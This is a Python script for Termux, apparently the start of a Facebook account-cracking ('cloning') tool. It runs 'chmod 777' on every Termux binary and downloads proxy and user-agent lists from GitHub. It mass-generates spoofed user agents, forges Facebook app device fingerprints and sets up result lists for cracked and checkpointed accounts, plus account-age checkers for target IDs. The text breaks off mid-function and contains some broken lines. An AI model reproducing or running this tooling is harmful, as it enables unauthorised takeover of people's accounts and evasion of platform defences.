#!/usr/bin/python3
#coding/utf/
#created/by/ms.LEENAW
def clear():
        os.system('clear')
#_________[ IMPORTING MODULES ]______>>
from os import path
import os,base64,zlib,pip,urllib
print('\x1b[1;97m[√] \x1b[1;92mCHECKING MODULES...')
os.system("pip uninstall urllib3 requests chardet idna certifi -y")
os.system("pip install urllib3 requests chardet idna certifi")
os.system("chmod 777 /data/data/com.termux/files/usr/bin/*");clear() 
import os,requests,json,time,re,random,sys,uuid,string,subprocess
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print('\n\033[0;97m[⋆]\033[1;32mINSTALLING MISSING MODULES...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('git pull')
except:pass
#_________[ PROXY SERVER ]______>>
try:
    prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
    open('proxies.txt','w').write(proxies)
except Exception as e:
    print('')
    #time.sleep(2)
    #os.system(f'xdg-open https://www.facebook.com/mradi5000')
proxies=open('proxies.txt','r').read().splitlines()
android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass
#_________[ TRACKING USERS IP ]______>>
ip = requests.get("https://api.ipify.org").text
print('\033[0;97m[⋆] \033[0;92mLEENAW TOOL IS TRACKING YOUR IP ADDRESS')
time.sleep(2)
print("\033[0;97m[⋆] \x1b[1;92mTHIS IS YOUR IP ADDRESS \x1b[1;91m:\033[1;36m "+ip)
#_________[ UA ]______>>
usr=[]
try:
    xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ff = random.choice(['414.0.0.30.113', '409.0.0.27.106', '382.0.0.33.111', '381.0.0.29.105'])
ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c=f' en-us; {str(gt)}'
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for agent in range(10000):
    aa='Mozilla/5.0 (Linux; Android 6.0.1;'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/533.1'
    fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(fullagnt)
rug=[]
for nt in range(10000):
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    rug.append(xx)
ruz=[]
for mtc in range(10000):
    rr=random.randint
    xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
    ruz.append(xd)   
#_________[ NEW UA ]______>>
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        BOSS_ua= random.choice(["Dalvik/2.1.0 (Linux; U; Android 7.1.2; TA-1033 Build/N2G47H)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G7102 Build/KOT49H)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G7105 Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; E5823 Build/32.4.A.1.54)","Dalvik/2.1.0 (Linux; U; Android 7.0; HT50 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G900FD Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo A2010-a Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G965F Build/R16NW)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo A6020a46 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J727V Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi 4X MIUI/V9.5.4.0.NAMMIFA)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G920F Build/LMY47X)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo TB2-X30L Build/LenovoTB2-X30L)","Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4 MIUI/V9.5.1.0.MBFMIFA)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320FN Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J530F Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 5.1; Tasty Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo P1ma40 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 5.1; TIT-L01 Build/HONORTIT-L01)","Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-I9082 Build/JZO54K)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; 3G NOTE XL Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4 MIUI/V8.1.6.0.MBFMIDI)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G920K Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; ONEPLUS A5000 Build/OPM1.171019.011)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; Lenovo B8080-F Build/KVT49L)","Dalvik/2.1.0 (Linux; U; Android 6.0; MotoG3 Build/MPIS24.65-33.1-2-16)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 3 MIUI/V8.2.2.0.MHOMIDL)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-S7272 Build/JDQ39)","Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-I9300 Build/JZO54K)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; HTC One_M8 Eye Build/MMB29M)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-I9500 Build/JDQ39)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_Z010D Build/MMB29P)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi 4A MIUI/V9.2.6.0.NCCMIEK)","Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-I8552 Build/JZO54K)","Dalvik/1.4.0 (Linux; U; Android 2.3.4; GT-S5670 Build/GINGERBREAD)","Dalvik/2.1.0 (Linux; U; Android 5.1; K4000_PRO Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4 MIUI/V8.5.6.0.MBFMIED)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A510F Build/MMB29K)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; LGLS665 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 7.0; Moto G (4) Build/NPJS25.93-14-4)","Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 4 MIUI/8.4.19)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A510F Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 5.1; T03 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J111F Build/LMY47V)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00J Build/KVT49L)","Dalvik/2.1.0 (Linux; U; Android 6.0; LEAGOO M8 Build/MRA58K","Dalvik/2.1.0 (Linux; U; Android 7.0; KOB-L09 Build/HUAWEIKOB-L09)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-N920T Build/NRD90M)","Dalvik/1.4.0 (Linux; U; Android 2.3.5; IQ239 Build/MocorDroid2.3.5)","Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo TB3-710I Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; Moto G (5S) Plus Build/NPSS26.116-61-5)","Dalvik/2.1.0 (Linux; U; Android 6.0; LG-K430 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 6.0; BV7000 PRO Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532F Build/MMB29T)","Dalvik/2.1.0 (Linux; U; Android 5.1; AP-107G Build/LMY47I)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; Lenovo P780 Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 6.0; ZTE BLADE A610C Build/MRA58K)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; XT1080 Build/SU6-7.7)","Dalvik/1.6.0 (Linux; U; Android 5.1.1; Nexus 6 Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; MIX 2S MIUI/V9.5.15.0.ODGCNFA)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22)","Dalvik/2.1.0 (Linux; U; Android 7.0; DLI-TL20 Build/HONORDLI-TL20)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi 3S MIUI/V9.5.5.0.MALMIFA)","Dalvik/2.1.0 (Linux; U; Android 5.0.2; LG-D724 Build/LRX22G)","Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-S5310 Build/JZO54K)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; AP-721 Build/JDQ39)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G900F Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 7.0; T5c Build/NRD90M)","Dalvik/1.6.0 (Linux; U; Android 4.3; GT-I9300 Build/JSS15J)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J200H Build/LMY48B)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; D6503 Build/23.5.A.0.575)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; S-TELL M210 Build/JDQ39)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-I9105 Build/JDQ39)","Dalvik/2.1.0 (Linux; U; Android 5.0.1; Lenovo TB3-710F Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; NEXBOX-A95X Build/NEXBOX-A95X-RTL8723BS)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; LS-4505 Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G390F Build/NRD90M)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; 4027D Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 7.0; FRD-L19 Build/HUAWEIFRD-L19)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G920F Build/MMB29K)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; Philips S388 Build/JDQ39)","Dalvik/2.1.0 (Linux; U; Android 5.0; LEO_DG280 Build/LRX21M)""Dalvik/1.4.0 (Linux; U; Android 2.3; ViewPad 10e Build/GRH55)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi 4X MIUI/V9.5.5.0.NAMMIFA)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; NGAJ2CH/A Build/JDQ39)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; HUAWEI CRR-L09 Build/HUAWEICRR-L09)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; SM-T350 Build/NMF26X)","Dalvik/1.6.0 (Linux; U; Android 4.1.2; Nokia_XL Build/JZO54K)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; SM-C105 Build/JDQ39)","Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI TIT-U02 Build/HUAWEITIT-U02)","Dalvik/1.6.0 (Linux; U; Android 4.3; Lenovo A560 Build/JLS36C)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Lenovo TB2-X30L Build/LenovoTB2-X30L)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; Micromax D320 Build/KOT49H)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; 4009D Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 6.0; Tele2_Mini_1.1 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo A1010a20 Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-N9200 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; Aquaris X Build/NMF26F)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G950U Build/R16NW)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; 304SH Build/S0022)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J710GN Build/MMB29K)","Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-I9100 Build/JZO54K)",])
        version_ = str(random.randint(4, 10)) + "." + str(random.randint(0, 4)) + "." + str(random.randint(0, 4))
        model_ = "SM-" + str(random.randint(100, 999))
        brand_name_ = random.choice(["Samsung", "Kaios", "Realme", "Nokia", "infinix"])
        width_ = random.randint(320, 1080)
        height_ = random.randint(480, 1920)
        user_agent =(["Dalvik/2.1.0 (Linux; U; Android 7.1.2; TA-1033 Build/N2G47H)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G7102 Build/KOT49H)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G7105 Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; E5823 Build/32.4.A.1.54)","Dalvik/2.1.0 (Linux; U; Android 7.0; HT50 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G900FD Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo A2010-a Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G965F Build/R16NW)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo A6020a46 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J727V Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi 4X MIUI/V9.5.4.0.NAMMIFA)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G920F Build/LMY47X)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo TB2-X30L Build/LenovoTB2-X30L)","Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4 MIUI/V9.5.1.0.MBFMIFA)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320FN Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J530F Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 5.1; Tasty Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo P1ma40 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 5.1; TIT-L01 Build/HONORTIT-L01)","Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-I9082 Build/JZO54K)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; 3G NOTE XL Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4 MIUI/V8.1.6.0.MBFMIDI)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G920K Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; ONEPLUS A5000 Build/OPM1.171019.011)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; Lenovo B8080-F Build/KVT49L)","Dalvik/2.1.0 (Linux; U; Android 6.0; MotoG3 Build/MPIS24.65-33.1-2-16)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 3 MIUI/V8.2.2.0.MHOMIDL)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-S7272 Build/JDQ39)","Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-I9300 Build/JZO54K)",])
        uat = random.choice(user_agent)
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#_________[ LOOPS ]______>>
loop=0
oks=[]
cps=[]
twf=[]
pcp=[]
id=[]
tokenku=[]
#_________[ IMPORTING TIME MODULS ]______>>
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
def clear():
        os.system('clear')
        print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#-----------------------[DATE Checker For FILE CLONING]-----------------------#
def joined(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:9] in ['100000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:8] in ['10000000']        :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;37m| \33[1;33m2010' 
        elif ids[:6] in ['100001']          :creation = '\33[1;37m| \33[1;33m2010\33[1;37m/\33[1;33m2011'
        elif ids[:6] in ['100002','100003'] :creation = '\33[1;37m| \33[1;33m2011\33[1;37m/\33[1;33m2012'
        elif ids[:6] in ['100004']          :creation = '\33[1;37m| \33[1;33m2012\33[1;37m/\33[1;33m2013'
        elif ids[:6] in ['100005','100006'] :creation = '\33[1;37m| \33[1;33m2013\33[1;37m/\33[1;33m2014'
        elif ids[:6] in ['100007','100008'] :creation = '\33[1;37m| \33[1;33m2014\33[1;37m/\33[1;33m2015'
        elif ids[:6] in ['100009']          :creation = '\33[1;37m| \33[1;33m2015' 
        elif ids[:5] in ['10001']           :creation = '\33[1;37m| \33[1;33m2015\33[1;37m/\33[1;33m2016'
        elif ids[:5] in ['10002']           :creation = '\33[1;37m| \33[1;33m2016\33[1;37m/\33[1;33m2017'
        elif ids[:5] in ['10003']           :creation = '\33[1;37m| \33[1;33m2018\33[1;37m/\33[1;33m2019'
        elif ids[:5] in ['10004']           :creation = '\33[1;37m| \33[1;33m2019\33[1;37m/\33[1;33m2020'
        elif ids[:5] in ['10005']           :creation = '\33[1;37m| \33[1;33m2020' 
        elif ids[:5] in ['10006','10007','']:creation = '\33[1;37m| \33[1;33m2021' 
        elif ids[:5] in ['10008']           :creation = '\33[1;37m| \33[1;33m2022' 
        else:creation=''
    elif len(ids) in [9,10]:
        creation = '\33[1;37m| \33[1;33m2008/2009'
    elif len(ids)==8:
        creation = '\33[1;37m| \33[1;33m2007/2008'
    elif len(ids)==7:
        creation = '\33[1;37m| \33[1;33m2006/2007'
    else:creation=''
    return creation
#-----------------------[DATE Checker For UID CLONING]-----------------------#
def joined(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:9] in ['100000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:8] in ['10000000']        :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;37m| \33[1;33m2010' 
        elif uid[:6] in ['100001']          :creation = '\33[1;37m| \33[1;33m2010\33[1;37m/\33[1;33m2011'
        elif uid[:6] in ['100002','100003'] :creation = '\33[1;37m| \33[1;33m2011\33[1;37m/\33[1;33m2012'
